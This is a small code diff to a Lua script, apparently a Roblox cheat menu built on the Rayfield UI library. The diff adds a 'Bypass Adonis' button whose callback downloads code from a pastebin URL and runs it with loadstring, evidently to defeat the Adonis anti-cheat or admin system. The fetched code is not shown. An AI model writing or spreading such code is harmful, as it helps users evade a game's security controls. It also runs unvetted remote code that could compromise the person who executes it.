@@ -114,4 +114,11 @@ MiscTab:CreateButton({
     end
 })
 
+MiscTab:CreateButton({
+    Name = "Bypass Adonis",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/iMvnRVBg"))()
+    end
+})
+
 Rayfield:LoadConfiguration()
